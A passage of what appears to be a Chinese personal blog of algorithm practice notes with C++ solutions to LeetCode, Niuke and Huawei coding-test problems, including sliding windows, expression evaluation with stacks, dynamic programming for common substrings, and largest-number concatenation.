<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,1,1,0,0,0,1,1,1,1,0], K = 2</span><br><span class="line">输出：6</span><br><span class="line">解释：[1,1,1,0,0,1,1,1,1,1,1]</span><br><span class="line">粗体数字从 0 翻转到 1，最长的子数组长度为 6。</span><br></pre></td></tr></table></figure>

<p>转换为滑动窗口问题，如果最大的窗口中的0的个数为k，就可以组成最大连续1的个数</p>
<p>双指针法，左指针控制左索引i，右指针控制右索引j   最大个数为j-i+1，记录0的个数zero</p>
<p>先遍历数组，如果nums[i]&#x3D;0,zero++</p>
<p>一旦zero&gt;k，就需要减少zero，那就是将左指针向右滑动，直到zero&lt;&#x3D;k，更新左索引</p>
<p>更新最大值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int longestOnes(vector&lt;int&gt;&amp; nums, int k) &#123;</span><br><span class="line">     int res=0,zero=0,left=0;</span><br><span class="line">     for(int r=0;r&lt;nums.size();++r)</span><br><span class="line">     &#123;</span><br><span class="line">         if(nums[r]==0) ++zero;</span><br><span class="line">         while(zero&gt;k)</span><br><span class="line">         &#123;</span><br><span class="line">             if(nums[left]==0)</span><br><span class="line">             &#123;</span><br><span class="line">                 --zero;</span><br><span class="line">             &#125; </span><br><span class="line">             left++;</span><br><span class="line">         &#125;</span><br><span class="line">         res=max(res,r-left+1);</span><br><span class="line">     &#125;</span><br><span class="line">     return res;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>



<h1 id="牛客"><a href="#牛客" class="headerlink" title="牛客"></a>牛客</h1><h2 id="表达式求值"><a href="#表达式求值" class="headerlink" title="表达式求值"></a>表达式求值</h2><h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;stack&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int pos = 0;</span><br><span class="line">bool priority(char m, char n) &#123;//判断优先度</span><br><span class="line">    if (m == &#x27;(&#x27;) return false;</span><br><span class="line">    else if ((m == &#x27;+&#x27; || m == &#x27;-&#x27;) &amp;&amp; (n == &#x27;*&#x27; || n == &#x27;/&#x27;)) return false;</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line">void cal(stack&lt;char&gt;&amp; op, stack&lt;int&gt;&amp; num) &#123;</span><br><span class="line"></span><br><span class="line">    int b = num.top();//先弹出来的属于第二个数</span><br><span class="line">    num.pop();</span><br><span class="line">    int a = num.top();</span><br><span class="line">    num.pop();</span><br><span class="line">    char zifu = op.top(); //栈顶运算符</span><br><span class="line">    op.pop();</span><br><span class="line">    if (zifu == &#x27;+&#x27;) a = a + b;</span><br><span class="line">    else if (zifu == &#x27;-&#x27;) a = a - b;</span><br><span class="line">    else if (zifu == &#x27;*&#x27;) a = a * b;</span><br><span class="line">    else a = a / b;</span><br><span class="line">    num.push(a);//计算后放回去</span><br><span class="line">&#125;</span><br><span class="line">int main() &#123;</span><br><span class="line">    string s;</span><br><span class="line">    cin &gt;&gt; s;</span><br><span class="line">    stack&lt;char&gt; op;</span><br><span class="line">    stack&lt;int&gt; num;</span><br><span class="line"></span><br><span class="line">    op.push(&#x27;(&#x27;);//先加个左括号</span><br><span class="line">    s += &#x27;)&#x27;;</span><br><span class="line">    bool flag = false;//是否出现了数字</span><br><span class="line">    for (int i = 0; i &lt; s.length(); i++) &#123;</span><br><span class="line">        if (s[i] == &#x27;(&#x27;) op.push(&#x27;(&#x27;);//遇到括号，放进op栈</span><br><span class="line">        else if (s[i] == &#x27;)&#x27;) &#123;//遇到右括号,计算，直到遇到左括号</span><br><span class="line">            while (op.top() != &#x27;(&#x27;) &#123;</span><br><span class="line">                cal(op, num);</span><br><span class="line">            &#125;</span><br><span class="line">            op.pop();//将左括号弹出</span><br><span class="line">        &#125; else if (flag) &#123; //出现了数字</span><br><span class="line"></span><br><span class="line">        //判断op栈顶优先于当前字符，计算</span><br><span class="line">            while (priority(op.top(), s[i])) &#123;</span><br><span class="line">                cal(op, num);</span><br><span class="line">            &#125;</span><br><span class="line">            op.push(s[i]);//否则加入新字符</span><br><span class="line">            flag = false;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            int j = i;</span><br><span class="line">            if (s[j] == &#x27;-&#x27; || s[j] == &#x27;+&#x27;) i++;</span><br><span class="line">            while (isdigit(s[i])) i++;</span><br><span class="line">            string temp = s.substr(j, i - j);</span><br><span class="line">            num.push(stoi(temp));</span><br><span class="line">            i--;</span><br><span class="line">            flag = true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; num.top() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="错误代码"><a href="#错误代码" class="headerlink" title="错误代码"></a>错误代码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void cal(vector&lt;char&gt; &amp;op,stack&lt;int&gt; &amp;num)</span><br><span class="line">&#123;</span><br><span class="line">   </span><br><span class="line">       char zifu=op[0];</span><br><span class="line">       op.erase(op.begin());</span><br><span class="line">       if(zifu==&#x27;+&#x27;)</span><br><span class="line">       &#123;</span><br><span class="line">            int a=num.top();</span><br><span class="line">            num.pop();</span><br><span class="line">            int b=num.top();</span><br><span class="line">            num.pop();</span><br><span class="line">            num.push(a+b);</span><br><span class="line">       &#125;</span><br><span class="line">        if(zifu==&#x27;-&#x27;)</span><br><span class="line">       &#123;</span><br><span class="line">            int a=num.top();</span><br><span class="line">            num.pop();</span><br><span class="line">            int b=num.top();</span><br><span class="line">            num.pop();</span><br><span class="line"></span><br><span class="line">            num.push(b-a);</span><br><span class="line">       &#125;</span><br><span class="line">         if(zifu==&#x27;*&#x27;)</span><br><span class="line">       &#123;</span><br><span class="line">            int a=num.top();</span><br><span class="line">            num.pop();</span><br><span class="line">            int b=num.top();</span><br><span class="line">            num.pop();</span><br><span class="line"></span><br><span class="line">            num.push(b*a);</span><br><span class="line">       &#125;</span><br><span class="line">       if(zifu==&#x27;/&#x27;)</span><br><span class="line">       &#123;</span><br><span class="line">            int a=num.top();</span><br><span class="line">            num.pop();</span><br><span class="line">            int b=num.top();</span><br><span class="line">            num.pop();</span><br><span class="line">            //不考虑b=0</span><br><span class="line">            num.push(b/a);</span><br><span class="line">       &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">int main() &#123;</span><br><span class="line">    string s;</span><br><span class="line">    cin&gt;&gt;s;</span><br><span class="line"></span><br><span class="line">    stack&lt;char&gt; op;</span><br><span class="line">    vector&lt;char&gt; opnew;//后缀操作符记录</span><br><span class="line">    stack&lt;int&gt; num;</span><br><span class="line">    string n=&quot;&quot;;</span><br><span class="line">    for(int i=0;i&lt;s.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">      //  </span><br><span class="line">        if(s[i]==&#x27;+&#x27;||s[i]==&#x27;-&#x27;||s[i]==&#x27;*&#x27;||s[i]==&#x27;/&#x27;||s[i]==&#x27;(&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                op.push(s[i]);</span><br><span class="line">                num.push(stoi(n));</span><br><span class="line">                n=&quot;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        else if(s[i]==&#x27;)&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            while(op.top()!=&#x27;(&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                opnew.push_back(op.top());</span><br><span class="line">                op.pop();</span><br><span class="line"></span><br><span class="line">                if(op.top()==&#x27;(&#x27;)</span><br><span class="line">              &#123;</span><br><span class="line">                op.pop();</span><br><span class="line">                break;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            n+=s[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    num.push(stoi(n));//获取最后一个值</span><br><span class="line"></span><br><span class="line">    //将op剩余的操作符给opnew</span><br><span class="line">    while(!op.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        opnew.push_back(op.top());</span><br><span class="line">        op.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    // for(auto a:opnew)</span><br><span class="line">    // &#123;</span><br><span class="line">    //     cout&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    // &#125;</span><br><span class="line">    // while(!num.empty())</span><br><span class="line">    // &#123;</span><br><span class="line">    //     cout&lt;&lt;num.top()&lt;&lt;endl;</span><br><span class="line">    //     num.pop();</span><br><span class="line">    // &#125;</span><br><span class="line">    while(!opnew.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        cal(opnew,num);</span><br><span class="line">    &#125;</span><br><span class="line">   //int result=0;</span><br><span class="line">   </span><br><span class="line">    cout&lt;&lt;num.top();</span><br><span class="line">    // cout&lt;&lt;num.top()&lt;&lt;&quot; &quot;&lt;&lt;num.size()&lt;&lt;endl;</span><br><span class="line">    // num.pop();</span><br><span class="line">    // cout&lt;&lt;num.top();</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>&#x2F;<br>*<br>10<br>5<br>400</p>
</blockquote>
<h2 id="尼科彻斯定理"><a href="#尼科彻斯定理" class="headerlink" title="尼科彻斯定理"></a>尼科彻斯定理</h2><p>a^3（a为任意）&#x3D;连续a个奇数的和</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   int n;</span><br><span class="line">   cin&gt;&gt;n;</span><br><span class="line"></span><br><span class="line">   int num=n*n*n;</span><br><span class="line">    int flag=-1,start=1;</span><br><span class="line">   for(int j=1;j&lt;num;j+=2)</span><br><span class="line">   &#123;</span><br><span class="line">        int co=0,result=0;</span><br><span class="line">        while(co&lt;n)</span><br><span class="line">        &#123;</span><br><span class="line">            result+=j+co*2;</span><br><span class="line">            co++;</span><br><span class="line">        &#125;</span><br><span class="line">        if(result==num)</span><br><span class="line">        &#123;</span><br><span class="line">            start=j;</span><br><span class="line">            flag=1;</span><br><span class="line">            break;</span><br><span class="line">        &#125; </span><br><span class="line">        </span><br><span class="line">   &#125;</span><br><span class="line">    if(flag==1)</span><br><span class="line">    &#123;</span><br><span class="line">       int co=0;</span><br><span class="line">       string s=&quot;&quot;;</span><br><span class="line">       while(co&lt;n)</span><br><span class="line">       &#123;</span><br><span class="line">        s+=to_string(start+co*2)+&quot;+&quot;;</span><br><span class="line">        co++;</span><br><span class="line">       &#125;</span><br><span class="line">    cout&lt;&lt;s.substr(0,s.size()-1);</span><br><span class="line">    &#125;</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进阶那就是等差数列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">   int n;</span><br><span class="line">   cin&gt;&gt;n;</span><br><span class="line"></span><br><span class="line">   int num=n*n*n;</span><br><span class="line">   //sn=na+n(n-1)*d/2 找首项的问题</span><br><span class="line">   int a=(num-n*(n-1))/n;</span><br><span class="line">   for(int i=0;i&lt;n;i++)</span><br><span class="line">   &#123;</span><br><span class="line">        cout&lt;&lt;to_string(a+i*2);</span><br><span class="line">        if(i!=n-1) cout&lt;&lt;&quot;+&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="公共子串计算"><a href="#公共子串计算" class="headerlink" title="公共子串计算"></a>公共子串计算</h2><p><strong>查找、动态规划</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">    string s1,s2;</span><br><span class="line">    cin&gt;&gt;s1&gt;&gt;s2;</span><br><span class="line">    int n=s1.size(),m=s2.size();</span><br><span class="line">    //int len1=s1.size(),len2=s2.size();</span><br><span class="line">    int maxlen=0;</span><br><span class="line">    vector&lt;vector&lt;int&gt; &gt;a(n+1,vector&lt;int&gt;(m+1,0));</span><br><span class="line">    //a[i][j] 即s1的前i个字符与s2的前j个字符的最大公共子串长度</span><br><span class="line">    //基础值填充</span><br><span class="line">    // for(int i=0;i&lt;n;i++)</span><br><span class="line">    // &#123;</span><br><span class="line">    //     if(s1[0]==s2[i])</span><br><span class="line">    //     &#123;</span><br><span class="line">    //         a[0][i]=1;</span><br><span class="line">    //         maxlen=1;</span><br><span class="line">    //     &#125;</span><br><span class="line">    //     //else a[0][i]=0;</span><br><span class="line">    // &#125;</span><br><span class="line">    // for(int i=0;i&lt;m;i++)</span><br><span class="line">    // &#123;</span><br><span class="line">    //     if(s1[i]==s2[0])</span><br><span class="line">    //     &#123;</span><br><span class="line">    //         a[i][0]=1;</span><br><span class="line">    //         maxlen=1;</span><br><span class="line">    //     &#125;</span><br><span class="line">    //     //else a[i][0]=0;</span><br><span class="line">    // &#125;</span><br><span class="line">    for(int i=1;i&lt;=n;i++)//注意是</span><br><span class="line">    for(int j=1;j&lt;=m;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(s1[i-1]==s2[j-1])//i为尾结点与j尾结点为止的字符相等</span><br><span class="line">        &#123;</span><br><span class="line">            a[i][j]=a[i-1][j-1]+1;//</span><br><span class="line">            maxlen=max(maxlen,a[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;maxlen;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="字符串字符匹配"><a href="#字符串字符匹配" class="headerlink" title="字符串字符匹配"></a>字符串字符匹配</h2><p>一个短字符串，一个长字符串，短串的字符在长串有所出现即可，不用管次数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">   string t1,t2;</span><br><span class="line">   while(cin&gt;&gt;t1&gt;&gt;t2)//多组样例输入</span><br><span class="line">&#123;</span><br><span class="line">     int n=t1.size(),m=t2.size();</span><br><span class="line">     map&lt;char,int&gt;mp;</span><br><span class="line">    for(int i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        mp[t1[i]]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    // for(auto a:mp)</span><br><span class="line">    // cout&lt;&lt;a.first&lt;&lt;&quot;,&quot;&lt;&lt;a.second&lt;&lt;endl;</span><br><span class="line">    for(auto&amp; list:mp)//这里要有&amp;，否则不会改变</span><br><span class="line">    for(int j=0;j&lt;m;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(list.second!=0)</span><br><span class="line">        &#123;</span><br><span class="line">        if(list.first==t2[j])</span><br><span class="line">         list.second=0;//list.second--不可取，只要子串的字符出现过</span><br><span class="line">         //即可，不用管次数</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    int flag=-1;</span><br><span class="line">    //cout&lt;&lt;endl;</span><br><span class="line">    for(auto a:mp)</span><br><span class="line">    &#123;</span><br><span class="line">    //    cout&lt;&lt;a.first&lt;&lt;&quot;,&quot;&lt;&lt;a.second&lt;&lt;endl;</span><br><span class="line">      if(a.second&gt;0)</span><br><span class="line">      &#123;</span><br><span class="line">        cout&lt;&lt;&quot;false&quot;&lt;&lt;endl;</span><br><span class="line">        flag=1;</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if(flag&lt;0) cout&lt;&lt;&quot;true&quot;&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   string t1,t2;</span><br><span class="line">   while(cin&gt;&gt;t1&gt;&gt;t2)//多组样例输入</span><br><span class="line">&#123;</span><br><span class="line">     int n=t1.size(),m=t2.size();</span><br><span class="line">     set&lt;char&gt; set1;</span><br><span class="line">    for(int i=0;i&lt;m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        set1.insert(t2[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    // for(auto a:mp)</span><br><span class="line">    // cout&lt;&lt;a.first&lt;&lt;&quot;,&quot;&lt;&lt;a.second&lt;&lt;endl;</span><br><span class="line">    int flag=-1;</span><br><span class="line">    for(auto list:t1)</span><br><span class="line">   &#123;</span><br><span class="line">    if(!set1.count(list))</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;&quot;false&quot;;</span><br><span class="line">        flag=1;</span><br><span class="line">        break;</span><br><span class="line">    &#125; </span><br><span class="line">   &#125;</span><br><span class="line">   if(flag&lt;0) cout&lt;&lt;&quot;true&quot;;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="华为机试"><a href="#华为机试" class="headerlink" title="华为机试"></a>华为机试</h1><h1 id="1-字符串分割"><a href="#1-字符串分割" class="headerlink" title="1.字符串分割"></a>1.字符串分割</h1><p>给定一个非空字符串S，其被N个‘-’分隔成N+1的子串，给定正整数K，要求除第一个子串外，其余的子串每K个字符组成新的子串，并用‘-’分隔。对于新组成的每一个子串，如果它含有的小写字母比大写字母多，则将这个子串的所有大写字母转换为小写字母；反之，如果它含有的大写字母比小写字母多，则将这个子串的所有小写字母转换为大写字母；大小写字母的数量相等时，不做转换。<br>输入描述:<br>输入为两行，第一行为参数K，第二行为字符串S。<br>输出描述:<br>输出转换后的字符串。<br>示例1<br>输入<br>3<br>12abc-abCABc-4aB@<br>输出<br>12abc-abc-ABC-4aB-@<br>说明<br>子串为12abc、abCABc、4aB@，第一个子串保留，后面的子串每3个字符一组为abC、ABc、4aB、@，abC中小写字母较多，转换为abc，ABc中大写字母较多，转换为ABC，4aB中大小写字母都为1个，不做转换，@中没有字母，连起来即12abc-abc-ABC-4aB-@<br>示例2<br>输入<br>12<br>12abc-abCABc-4aB@<br>输出<br>12abc-abCABc4aB@<br>说明<br>子串为12abc、abCABc、4aB@，第一个子串保留，后面的子串每12个字符一组为abCABc4aB@，这个子串中大小写字母都为4个，不做转换，连起来即12abc-abCABc4aB@</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;cstring&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">string zichuan(string s) //将子串转换大小写</span><br><span class="line">&#123;</span><br><span class="line">    int xiaoxie=1,daxie=1; //统计小写与大写数量</span><br><span class="line">    for(int i=0;i&lt;s.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(s[i]&gt;=&#x27;a&#x27;&amp;&amp;s[i]&lt;=&#x27;z&#x27;)</span><br><span class="line">                xiaoxie++;</span><br><span class="line">        if(s[i]&gt;=&#x27;A&#x27;&amp;&amp;s[i]&lt;=&#x27;Z&#x27;)</span><br><span class="line">                daxie++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(xiaoxie&gt;daxie)           //若小写的多，将大写字母转化为小写。</span><br><span class="line">    for(int j=0;j&lt;s.size();j++)</span><br><span class="line">        if(s[j]&gt;=&#x27;A&#x27;&amp;&amp;s[j]&lt;=&#x27;Z&#x27;)</span><br><span class="line">        s[j]=(s[j]-&#x27;A&#x27;)%26+&#x27;a&#x27;;</span><br><span class="line"></span><br><span class="line">    if(xiaoxie&lt;daxie)</span><br><span class="line">    for(int j=0;j&lt;s.size();j++)</span><br><span class="line">        if(s[j]&gt;=&#x27;a&#x27;&amp;&amp;s[j]&lt;=&#x27;z&#x27;)</span><br><span class="line">        s[j]=(s[j]-&#x27;a&#x27;)%26+&#x27;A&#x27;;</span><br><span class="line"></span><br><span class="line">    return s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    string s;</span><br><span class="line">    cin&gt;&gt;s;</span><br><span class="line">    string ch1=&quot;&quot;,ch=&quot;&quot;;    //ch1记为第一子串；ch为其它子串总和</span><br><span class="line">    int co=0,co1=0,flag=0;  //co为ch的长度,co1用来统计从0开始的子串个数,flag用来区分是否是第一字串</span><br><span class="line">    for(int i=0;i&lt;s.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">       char c=s[i];</span><br><span class="line">       if(c==&#x27;-&#x27;)</span><br><span class="line">        flag=1;</span><br><span class="line">     if(flag==0&amp;&amp;c!=&#x27;-&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            ch1+=c; //第一个字符串</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    if(flag==1&amp;&amp;c!=&#x27;-&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        ch+=c;</span><br><span class="line">        co++; //</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //已知ch1,co,ch了</span><br><span class="line">    int t=co-co%n;//从该位置往后，字符数是不足k个的</span><br><span class="line">   // cout&lt;&lt;t&lt;&lt;endl&lt;&lt;ch;</span><br><span class="line">    string ch2=&quot;&quot;; //子字符串</span><br><span class="line">    for(int j=0;j&lt;co;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        ch2+=ch[j];</span><br><span class="line">        co1++;</span><br><span class="line">        if(co1&lt;=t) //&lt;t不行</span><br><span class="line">        &#123;</span><br><span class="line">            if(co1%n==0) </span><br><span class="line">             &#123;</span><br><span class="line">            ch1=ch1+&#x27;-&#x27;+zichuan(ch2);</span><br><span class="line">            //cout&lt;&lt;ch2&lt;&lt;co1&lt;&lt;endl;</span><br><span class="line">            ch2=&quot;&quot;;//清零</span><br><span class="line">             &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else if(co1==co)</span><br><span class="line">        &#123;</span><br><span class="line">            ch1=ch1+&#x27;-&#x27;+zichuan(ch2);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">     cout&lt;&lt;ch1&lt;&lt;endl&lt;&lt;co&lt;&lt;endl&lt;&lt;t;</span><br><span class="line">     //cout&lt;&lt;zichuan(ch)&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="2-组成最大数"><a href="#2-组成最大数" class="headerlink" title="2.组成最大数"></a>2.组成最大数</h1><p>小组中每位都有一张卡片<br>卡片是<code>6</code>位以内的正整数<br>将卡片连起来可以组成多种数字<br>计算组成的最大数字</p>
<h2 id="输入描述"><a href="#输入描述" class="headerlink" title="输入描述"></a>输入描述</h2><p><code>,</code>分割的多个正整数字符串<br>不需要考虑非数字异常情况<br>小组种最多<code>25</code>个人</p>
<h2 id="输出描述"><a href="#输出描述" class="headerlink" title="输出描述"></a>输出描述</h2><p>最大数字字符串</p>
<h2 id="示例一"><a href="#示例一" class="headerlink" title="示例一"></a>示例一</h2><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22,221</span><br></pre></td></tr></table></figure>

<h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22221</span><br></pre></td></tr></table></figure>

<h3 id="思想-2"><a href="#思想-2" class="headerlink" title="思想"></a>思想</h3><p>长度相同，数值大的在前；</p>
<p>长度不同，拼接值大的在前</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">cmp</span>&#123;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(string a,string b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        string c1=a+b;</span><br><span class="line">        string c2=b+a;</span><br><span class="line">        <span class="keyword">return</span> c1&gt;c2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;sds;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;string&gt; s;</span><br><span class="line">    string t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="function">istringstream <span class="title">iss</span><span class="params">(t)</span></span>;</span><br><span class="line">    string token;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">getline</span>(iss,token,<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        s.<span class="built_in">push_back</span>(token);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    iss.<span class="built_in">clear</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// while(cin&gt;&gt;num)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     s.push_back(num); //先获取值</span></span><br><span class="line">    <span class="comment">//     if(cin.get()==&#x27;\n&#x27;) break;</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="built_in">sort</span>(s.<span class="built_in">begin</span>(),s.<span class="built_in">end</span>(),<span class="built_in">cmp</span>());<span class="comment">//或者asd</span></span><br><span class="line">   </span><br><span class="line">    <span class="comment">// for(vector&lt;string&gt;::iterator it=s.begin();it!=s.end();it++)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     cout&lt;&lt;*it&lt;&lt;endl;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">  </span><br><span class="line">    string result=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)  <span class="comment">//存在[0,0]的情况。这样处理会是00</span></span><br><span class="line">    result+=s[i];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(result[<span class="number">0</span>]==<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;result;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="拼接最大值"><a href="#拼接最大值" class="headerlink" title="*拼接最大值"></a>*拼接最大值</h2><p>给定长度分别为 m 和 n 的两个数组，其元素由 0-9 构成，表示两个自然数各位上的数字。现在从这两个数组中选出 k (k &lt;&#x3D; m + n) 个数字拼接成一个新的数，要求从同一个数组中取出的数字保持其在原数组中的相对顺序。</p>
<p>求满足该条件的最大数。结果返回一个表示该最大数的长度为 k 的数组。</p>
<p>说明: 请尽可能地优化你算法的时间和空间复杂度。</p>
<p>示例 1:</p>
<p>输入:<br>nums1 &#x3D; [3, 4, 6, 5]<br>nums2 &#x3D; [9, 1, 2, 5, 8, 3]<br>k &#x3D; 5<br>输出:<br>[9, 8, 6, 5, 3]<br>示例 2:</p>
<p>输入:<br>nums1 &#x3D; [6, 7]<br>nums2 &#x3D; [6, 0, 4]<br>k &#x3D; 5<br>输出:<br>[6, 7, 6, 0, 4]<br>示例 3:</p>
<p>输入:<br>nums1 &#x3D; [3, 9]<br>nums2 &#x3D; [8, 9]<br>k &#x3D; 3<br>输出:<br>[9, 8, 9]</p>
<h3 id="思想-3"><a href="#思想-3" class="headerlink" title="思想"></a>思想</h3><p>求子问题，nums1中取i个组成最大的子序列，nums2中取k-i个，组成最大的子序列，合并，求所有的i的可能</p>
<p>要使得子序列最大，那从左到右是递减的</p>
<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">maxNumber</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, vector&lt;<span class="type">int</span>&gt;&amp; nums2, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       vector&lt;<span class="type">int</span>&gt; max_n1,max_n2;</span><br><span class="line">       <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">maxseq</span><span class="params">(k,<span class="number">0</span>)</span></span>;</span><br><span class="line">       <span class="type">int</span> n1=nums1.<span class="built_in">size</span>(),n2=nums2.<span class="built_in">size</span>();</span><br><span class="line">       <span class="type">int</span> start=<span class="built_in">max</span>(<span class="number">0</span>,k-n2);<span class="comment">//表示从nums1中取得的下限</span></span><br><span class="line">       <span class="type">int</span> end=<span class="built_in">min</span>(k,n1);<span class="comment">//表示从nums1中取得的上限</span></span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">       如果k-n2为负数，意味着不需要在</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> 